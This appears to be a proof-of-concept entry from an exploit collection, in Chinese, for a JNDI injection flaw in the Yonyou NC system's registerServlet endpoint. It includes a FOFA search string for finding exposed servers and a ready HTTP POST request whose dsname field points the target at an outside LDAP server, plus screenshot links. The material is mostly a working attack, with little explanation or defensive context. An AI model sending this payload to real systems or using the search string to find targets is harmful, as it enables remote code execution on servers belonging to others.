## 用友NC系统registerServlet接口存在JNDI注入漏洞

## fofa
```
body="Client/Uclient/UClient.dmg"
```


## poc
```
POST /portal/registerServlet HTTP/1.1
Host: 192.168.63.129:8088
User-Agent: Mozilla/5.0 (X11; CrOS i686 3912.101.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.116 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Content-Length: 68

type=1&dsname=ldap://172.17.176.1:8085/blvVEcJU1
```

![image](https://github.com/wy876/POC/assets/139549762/1aac8d1d-b2c5-4f2d-af47-97c363a59274)

![image](https://github.com/wy876/POC/assets/139549762/e7c8e733-01fc-468b-9acc-b4de63428cdc)
